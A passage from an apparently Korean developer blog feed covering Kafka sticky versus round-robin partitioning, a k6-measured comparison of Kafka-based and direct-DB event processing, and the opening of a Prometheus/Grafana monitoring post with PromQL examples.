  &lt;li&gt;프로듀서에서 메시지 키를 입력하지 않은 경우, &lt;br /&gt;
스티키 파티셔너는 새로운 메시지가 이전 메시지를 &lt;br /&gt;
소비했던 컨슈머로 전달되도록 같은 파티션에 넣는다.&lt;/li&gt;
  &lt;li&gt;이를 통해 동일한 파티션에 메시지를 모아 더 큰 배치를 생성하여 &lt;br /&gt;
전송 횟수와 네트워크 오버헤드를 감소시켜 &lt;br /&gt;
결과적으로 지연 시간을 단축시킨다.&lt;/li&gt;
  &lt;li&gt;실제로 실험해보면 라운드로빈 설정보다 &lt;br /&gt;
스티키 설정이 전체 처리 시간이 더 짧게 나타난다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;의문2--스티키-설정-시-나머지-파티션은-사용되지-않는가&quot;&gt;의문2 -스티키 설정 시 나머지 파티션은 사용되지 않는가?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;아니다. 스티키도 일정 조건이 되면 다른 파티션으로 메세지를 전송한다.&lt;/li&gt;
  &lt;li&gt;프로듀서의 메시지 버퍼가 꽉 차거나 linger.ms 시간(배치 전송 지연시간)이 &lt;br /&gt;
만료되면 현재 배치를 전송하고 새로운 파티션을 선택한다.&lt;/li&gt;
  &lt;li&gt;따라서 트래픽이 많아 프로듀서에 메시지가 많이 전달되면 &lt;br /&gt;
메시지 버퍼가 더 빠르게 차게 되고, &lt;br /&gt;
이 경우 다른 파티션으로 전달하는 일이 잦아져 &lt;br /&gt;
결국 메시지가 파티션에 고루 분배된다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;의문3---그럼-특정-파티션으로-메세지를-보내고-싶으면-어떻게-하는가&quot;&gt;의문3 - 그럼 특정 파티션으로 메세지를 보내고 싶으면 어떻게 하는가?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;프로듀서에서 메세지 키를 입력하면 된다.&lt;/li&gt;
  &lt;li&gt;동일한 메세지 키를 가진 메세지는 해당 파티션으로 전달된다.&lt;/li&gt;
  &lt;li&gt;반대로 매번 새로운 파티션으로 보내고 싶다면 &lt;br /&gt;
메세지 키를 랜덤으로 설정하면 된다(라운드로빈).
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c1&quot;&gt;// 프로듀서  &lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Service&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;c1&quot;&gt;// 랜덤 키 생성  &lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;randomUUID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
                    
        &lt;span class=&quot;c1&quot;&gt;// 랜덤 키 추가  &lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
            
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;의문4---파티션-수가-3-컨슈머-수가-1이라면&quot;&gt;의문4 - 파티션 수가 3, 컨슈머 수가 1이라면?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;3개의 파티션을 1개의 컨슈머가 한 번씩 파티션을 순회하며 처리한다.
    &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;GROUP TOPIC PARTITION CURRENT-OFFSET LOG-END-OFFSET LAG CONSUMER-ID HOST CLIENT-ID  
user user 0 8 8 0 consumer-user-8-540afe8a-734e-439c-a7d4-e8fe84088068 /172.18.0.1 consumer-user-8  
user user 2 4 4 0 consumer-user-8-540afe8a-734e-439c-a7d4-e8fe84088068 /172.18.0.1 consumer-user-8  
user user 1 0 0 0 consumer-user-8-540afe8a-734e-439c-a7d4-e8fe84088068 /172.18.0.1 consumer-user-8  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;새로운 메세지가 생성되지 않는 상태에서 &lt;br /&gt;
3개의 파티션에 골고루 메세지가 쌓여있는 상황이라면&lt;br /&gt;
결과적으로 1개의 컨슈머가 순회하면서 모두 처리한다.&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Kafka" /><category term="kafka" /><category term="spring" /><category term="kotlin" /><category term="concurrency" /><summary type="html">개요 Spring Kafka의 @KafkaListener 어노테이션에서 concurrency 속성을 설정하면, 리스너 컨테이너가 해당 수만큼의 스레드를 생성하여 동일한 리스너 로직을 병렬로 실행하며 메시지를 처리한다.</summary></entry><entry><title type="html">Kafka를 활용한 대용량 이벤트 처리 구조 설계와 성능 비교</title><link href="https://a3magic3pocket.github.io/posts/kafka-large-scale-event-processing-architecture-and-performance-comparison/" rel="alternate" type="text/html" title="Kafka를 활용한 대용량 이벤트 처리 구조 설계와 성능 비교" /><published>2025-04-11T22:30:12+09:00</published><updated>2025-05-08T21:47:35+09:00</updated><id>https://a3magic3pocket.github.io/posts/kafka-large-scale-event-processing-architecture-and-performance-comparison</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/kafka-large-scale-event-processing-architecture-and-performance-comparison/">&lt;h2 id=&quot;목적&quot;&gt;목적&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;서비스에서 처리량이 증가하거나 작업 시간이 길어지는 상황에서 &lt;br /&gt;
기존의 동기식 직접 DB 접근방식이 가진 한계를 확인하고 &lt;br /&gt;
Kafka 기반 비동기 처리 구조의 성능 및 안정성을 확인하기 위함&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;실험환경&quot;&gt;실험환경&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;애플리케이션Kotlin Spring Boot 기반 API 서버&lt;/li&gt;
  &lt;li&gt;DB: MariaDB&lt;/li&gt;
  &lt;li&gt;Kafka: 단일 노드&lt;/li&gt;
  &lt;li&gt;트랜잭션 타임아웃: 1분&lt;/li&gt;
  &lt;li&gt;인위적 딜레이: 일부 실험에서 0.3초 지연 삽입&lt;/li&gt;
  &lt;li&gt;성능 측정 도구: &lt;a href=&quot;https://k6.io&quot; target=&quot;_blank&quot;&gt;k6&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;vus: 1000(가상 유저 1000명)&lt;/li&gt;
      &lt;li&gt;durations: 5m (총 5분간 실행)&lt;/li&gt;
      &lt;li&gt;iterations: 3000 (총 요청 수:3000)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;측정-기준&quot;&gt;측정 기준&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;처리 시간 (diffSec)
    &lt;ul&gt;
      &lt;li&gt;inventory: 첫 번째 행의 createdAt과 마지막 행의 createdAt의 차이&lt;/li&gt;
      &lt;li&gt;order: 동일한 행의 createdAt과 updatedAt의 차이&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;실패율 (Failure Rate)
    &lt;ul&gt;
      &lt;li&gt;부하 테스트 도구 &lt;strong&gt;k6&lt;/strong&gt; 기준&lt;/li&gt;
      &lt;li&gt;rate: 실패율 (0.0 = 모두 성공, 1.0 = 모두 실패)&lt;/li&gt;
      &lt;li&gt;passes: 실패 요청 수 (예: HTTP 오류)&lt;/li&gt;
      &lt;li&gt;fails: 성공 요청 수&lt;/li&gt;
      &lt;li&gt;추가적으로 DB에 실제 반영된 quantity 값도 함께 검토&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;실험-결과-요약&quot;&gt;실험 결과 요약&lt;/h2&gt;

&lt;h3 id=&quot;inventory-삽입-3000건&quot;&gt;Inventory 삽입 (3000건)&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;실험&lt;/th&gt;
      &lt;th&gt;방식&lt;/th&gt;
      &lt;th&gt;파티션/배치&lt;/th&gt;
      &lt;th&gt;락&lt;/th&gt;
      &lt;th&gt;처리 시간 (초)&lt;/th&gt;
      &lt;th&gt;실패율&lt;/th&gt;
      &lt;th&gt;결과&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;inventory1&lt;/td&gt;
      &lt;td&gt;직접 DB 접근&lt;/td&gt;
      &lt;td&gt;-&lt;/td&gt;
      &lt;td&gt;없음&lt;/td&gt;
      &lt;td&gt;30&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;inventory2&lt;/td&gt;
      &lt;td&gt;Kafka + 단일 파티션&lt;/td&gt;
      &lt;td&gt;단건&lt;/td&gt;
      &lt;td&gt;없음&lt;/td&gt;
      &lt;td&gt;34&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;inventory3&lt;/td&gt;
      &lt;td&gt;Kafka + 3파티션&lt;/td&gt;
      &lt;td&gt;단건&lt;/td&gt;
      &lt;td&gt;없음&lt;/td&gt;
      &lt;td&gt;27&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;inventory4&lt;/td&gt;
      &lt;td&gt;Kafka + 3파티션&lt;/td&gt;
      &lt;td&gt;배치(20건)&lt;/td&gt;
      &lt;td&gt;없음&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;단일-order-update---딜레이-없음-최초-삽입-1건-갱신-3000건&quot;&gt;단일 Order UPDATE - 딜레이 없음 (최초 삽입 1건, 갱신 3000건)&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;실험&lt;/th&gt;
      &lt;th&gt;방식&lt;/th&gt;
      &lt;th&gt;락&lt;/th&gt;
      &lt;th&gt;Kafka 파티션&lt;/th&gt;
      &lt;th&gt;처리 시간 (초)&lt;/th&gt;
      &lt;th&gt;실패율&lt;/th&gt;
      &lt;th&gt;결과&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;order1&lt;/td&gt;
      &lt;td&gt;직접 DB 접근&lt;/td&gt;
      &lt;td&gt;비관적 락&lt;/td&gt;
      &lt;td&gt;없음&lt;/td&gt;
      &lt;td&gt;49&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;order2&lt;/td&gt;
      &lt;td&gt;Kafka 컨슈머&lt;/td&gt;
      &lt;td&gt;없음&lt;/td&gt;
      &lt;td&gt;1개&lt;/td&gt;
      &lt;td&gt;52&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;order3&lt;/td&gt;
      &lt;td&gt;Kafka 컨슈머&lt;/td&gt;
      &lt;td&gt;비관적 락&lt;/td&gt;
      &lt;td&gt;3개&lt;/td&gt;
      &lt;td&gt;38&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;단일-order-update---딜레이-03초-타임아웃-1분-최초-삽입-1건-갱신-3000건&quot;&gt;단일 Order UPDATE - 딜레이 0.3초 (타임아웃 1분, 최초 삽입 1건, 갱신 3000건)&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;실험&lt;/th&gt;
      &lt;th&gt;방식&lt;/th&gt;
      &lt;th&gt;락&lt;/th&gt;
      &lt;th&gt;Kafka 파티션&lt;/th&gt;
      &lt;th&gt;처리 시간 (초)&lt;/th&gt;
      &lt;th&gt;처리된 quantity&lt;/th&gt;
      &lt;th&gt;실패율&lt;/th&gt;
      &lt;th&gt;결과&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;order1&lt;/td&gt;
      &lt;td&gt;직접 DB 접근&lt;/td&gt;
      &lt;td&gt;비관적 락&lt;/td&gt;
      &lt;td&gt;없음&lt;/td&gt;
      &lt;td&gt;303&lt;/td&gt;
      &lt;td&gt;328&lt;/td&gt;
      &lt;td&gt;0.972&lt;/td&gt;
      &lt;td&gt;❌&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;order2&lt;/td&gt;
      &lt;td&gt;Kafka 컨슈머&lt;/td&gt;
      &lt;td&gt;없음&lt;/td&gt;
      &lt;td&gt;1개&lt;/td&gt;
      &lt;td&gt;384&lt;/td&gt;
      &lt;td&gt;3001&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;order3&lt;/td&gt;
      &lt;td&gt;Kafka 컨슈머&lt;/td&gt;
      &lt;td&gt;비관적 락&lt;/td&gt;
      &lt;td&gt;3개&lt;/td&gt;
      &lt;td&gt;333&lt;/td&gt;
      &lt;td&gt;3001&lt;/td&gt;
      &lt;td&gt;0.0&lt;/td&gt;
      &lt;td&gt;✅&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;실패율-상세&quot;&gt;실패율 상세&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;k6 실패율 계산 기준
    &lt;ul&gt;
      &lt;li&gt;rate: 실패율 (0.0 = 100% 성공, 1.0 = 100% 실패)&lt;/li&gt;
      &lt;li&gt;passes: 실패 요청 수 (예: HTTP 500 등)&lt;/li&gt;
      &lt;li&gt;fails: 성공 요청 수&lt;/li&gt;
      &lt;li&gt;실패율 = passes / (passes + fails)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;실패 발생 실험: order1(직접 DB 접근 + 딜레이)
    &lt;ul&gt;
      &lt;li&gt;요청 기준 성공률: 약 2.8%(84/3001)&lt;/li&gt;
      &lt;li&gt;실제 DB 반영 성공 수량: 328건
        &lt;ul&gt;
          &lt;li&gt;일부 실패 응답이 DB에는 성공적으로 반영된 것으로 추정&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;결론&quot;&gt;결론&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Kafka 기반의 비동기 처리 구조는 직접 DB 접근 방식에 비해 &lt;br /&gt;
다음의 이점을 갖는다.&lt;/li&gt;
  &lt;li&gt;높은 안정성
    &lt;ul&gt;
      &lt;li&gt;직접 DB 접근 방식은 요청이 몰릴수록 트랜잭션 충돌, 락 경합, 커넥션 부족등의 이슈로 인해 실패율이 높아지는 경향이 있다.&lt;/li&gt;
      &lt;li&gt;특히 급격하게 트래픽이 몰려 DB 커넥션이 부족해지고 트랜잭션 처리 시간이 길어질 경우 실패율이 급격히 올라가며, 동시에 DB 부하도 높아져 다른 기능에 영향을 준다.&lt;/li&gt;
      &lt;li&gt;반면 Kafka 비동기 구조에서는 모든 요청을 큐잉하고 순차적으로 처리하기 때문에 요청량이 일시적으로 급증하더라도 상대적으로 안정적으로 처리 흐름을 유지할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;수평적 확장성
    &lt;ul&gt;
      &lt;li&gt;Kafka는 파티션을 추가 및 컨슈머 수를 늘리고,&lt;br /&gt;
배치 처리(batch)를 도입함으로써 &lt;br /&gt;
처리 성능을 선형적으로 확장할 수 있다.&lt;/li&gt;
      &lt;li&gt;실제 실험에서도 Kafka 파티션 수를 늘리고 배치 처리까지 도입하자&lt;br /&gt;
처리 시간(diffSec)이 눈에 띄게 줄어들었다.&lt;/li&gt;
      &lt;li&gt;즉, 트래픽이 늘어나더라도 유연하게 대응할 수 있는 구조이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DB 부하 감소 및 시스템 전반의 응답성 향상
    &lt;ul&gt;
      &lt;li&gt;Kafka 구조는 비동기 방식으로 동작하기 때문에, 사용자 요청 시점에 DB에 직접 접근하지 않는다.&lt;/li&gt;
      &lt;li&gt;내부 처리 과정에서 병목이 발생하더라도, 요청을 Kafka가 우선 수신하고 처리하므로 DB에는 상대적으로 여유 있는 요청만 전달된다.&lt;/li&gt;
      &lt;li&gt;이로 인해 과도한 동시 요청이 DB에 몰리는 상황을 효과적으로 방지할 수 있다.&lt;/li&gt;
      &lt;li&gt;실험 결과에서도 이런 차이는 명확히 드러난다.&lt;/li&gt;
      &lt;li&gt;직접 DB 접근 방식에서는 트래픽이 몰려 DB 타임아웃이 발생한 이후부터는 조회 요청까지 큰 지연을 겪었다.&lt;/li&gt;
      &lt;li&gt;반면 Kafka 기반 구조는 처리 작업과 조회 요청이 서로 영향을 받지 않기 때문에, 초기 몇 초를 제외하고는 조회 응답 시간이 안정적으로 유지되었다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;번외---스티키-파티셔너-vs-라운드로빈-파티셔너&quot;&gt;번외 - 스티키 파티셔너 vs 라운드로빈 파티셔너&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;기존 실험에서는 프로듀서에서 파티션 키를 설정하지 않았기 때문에&lt;br /&gt;
기본 설정인 &lt;strong&gt;스티키 파티셔너&lt;/strong&gt;를 사용했다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;이번에는 파티션을 3개 사용하는 테스트 시나리오만 모아,&lt;br /&gt;
프로듀서에서 &lt;strong&gt;랜덤 키를 설정&lt;/strong&gt;하여 &lt;strong&gt;라운드로빈 파티셔너&lt;/strong&gt;를 사용하도록 실험하였다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;두 파티셔너 간의 처리 시간 차이 비교&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;항목&lt;/th&gt;
          &lt;th&gt;Sticky 파티셔너&lt;/th&gt;
          &lt;th&gt;Round-Robin 파티셔너&lt;/th&gt;
          &lt;th&gt;차이&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;Order3 (딜레이 없음, 갱신)&lt;/td&gt;
          &lt;td&gt;38초&lt;/td&gt;
          &lt;td&gt;39초&lt;/td&gt;
          &lt;td&gt;+1초&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Order3 (딜레이 있음, 갱신)&lt;/td&gt;
          &lt;td&gt;333초&lt;/td&gt;
          &lt;td&gt;346초&lt;/td&gt;
          &lt;td&gt;+13초&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Inventory3 (파티션 3개, 삽입)&lt;/td&gt;
          &lt;td&gt;27초&lt;/td&gt;
          &lt;td&gt;32초&lt;/td&gt;
          &lt;td&gt;+5초&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Inventory4 (배치 삽입)&lt;/td&gt;
          &lt;td&gt;18초&lt;/td&gt;
          &lt;td&gt;25초&lt;/td&gt;
          &lt;td&gt;+7초&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;모든 항목에서 &lt;strong&gt;Sticky 파티셔너가 Round-Robin 파티셔너보다 더 빠른 처리 속도&lt;/strong&gt;를 보였다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;참고&quot;&gt;참고&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/a3magic3pocket/kafka-scalability-sandbox&quot; target=&quot;_blank&quot;&gt;실험 소스코드 - kafka-scalability-sandbox&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Kafka" /><category term="kafka" /><category term="spring" /><category term="kotlin" /><summary type="html">목적 서비스에서 처리량이 증가하거나 작업 시간이 길어지는 상황에서 기존의 동기식 직접 DB 접근방식이 가진 한계를 확인하고 Kafka 기반 비동기 처리 구조의 성능 및 안정성을 확인하기 위함</summary></entry><entry><title type="html">메트릭 모니터링(prometheus, grafana, alertmanager)</title><link href="https://a3magic3pocket.github.io/posts/metrics-monitoring-with-prometheus-grafana-and-alertmanager/" rel="alternate" type="text/html" title="메트릭 모니터링(prometheus, grafana, alertmanager)" /><published>2025-04-06T08:49:51+09:00</published><updated>2025-04-11T22:27:26+09:00</updated><id>https://a3magic3pocket.github.io/posts/metrics-monitoring-with-prometheus-grafana-and-alertmanager</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/metrics-monitoring-with-prometheus-grafana-and-alertmanager/">&lt;h2 id=&quot;정의&quot;&gt;정의&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;시스템 상태와 성능을 지속적으로 관찰하고 분석하는 과정&lt;br /&gt;
이를 통해 문제를 조기에 발견하는 것을 목표로 한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;메트릭metric이란&quot;&gt;메트릭(metric)이란&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;시스템, 애플리케이션 또는 프로세스의 성능이나 상태를 &lt;br /&gt;
수치적으로 표현한 데이터 포인트&lt;/li&gt;
  &lt;li&gt;우리는 메트릭을 지속적으로 수집하여&lt;br /&gt;
문제 발생 시 경고(alert)을 보내거나&lt;br /&gt;
시각화하여 문제를 빠르게 판단하는 시스템을 구축한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;사용툴&quot;&gt;사용툴&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;프로메테우스(prometheus)
    &lt;ul&gt;
      &lt;li&gt;메트릭 수집 및 저장&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그라파나(grafana)
    &lt;ul&gt;
      &lt;li&gt;메트릭을 시각화&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;얼럿매니저(alertmanager)
    &lt;ul&gt;
      &lt;li&gt;메트릭 조건식을 지정하여 조건식을 만족하면 메신저로 메세지 전송&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;프로메테우스-메트릭-익스포터metric-exporter-종류&quot;&gt;프로메테우스 메트릭 익스포터(metric exporter) 종류&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;node_exporter: 시스템 메트릭을 수집한다&lt;/li&gt;
  &lt;li&gt;spring_exporter: 스프링 애플리케이션 매트릭을 수집힌다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;node_exporter-메트릭&quot;&gt;node_exporter 메트릭&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;주요 기능
    &lt;ul&gt;
      &lt;li&gt;CPU, 메모리, 디스크, 네트워크 대역폭, node_exporter의 gc(garbage collection)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;주요 메트릭
    &lt;ul&gt;
      &lt;li&gt;CPU 사용률
        &lt;ul&gt;
          &lt;li&gt;(sum(rate(node_cpu_seconds_total{mode!=”idle”}[5m])) by (instance))&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;사용 가능한 메모리 비율
        &lt;ul&gt;
          &lt;li&gt;(node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;디스크 사용률
        &lt;ul&gt;
          &lt;li&gt;(node_filesystem_size_bytes - node_filesystem_avail_bytes) / node_filesystem_size_bytes&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;네트워크 평균 수신 속도(최근 1시간)
        &lt;ul&gt;
          &lt;li&gt;avg_over_time(rate(node_network_receive_bytes_total[5m])[1h:5m])&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;node_exporter 평균 gc 시간
        &lt;ul&gt;
          &lt;li&gt;avg(rate(go_gc_duration_seconds[5m])) by (instance)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;참고
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://prometheus.io/docs/guides/node-exporter/&quot; target=&quot;_blank&quot;&gt;설치가이드 및 메트릭 설명&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;spring_exporter-메트릭&quot;&gt;spring_exporter 메트릭&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;주요 기능
    &lt;ul&gt;
      &lt;li&gt;HTTP 요청, JVM, gc, 활성스레드, 스프링 CPU 사용량, 스프링 디스크 I/O&lt;/li&gt;
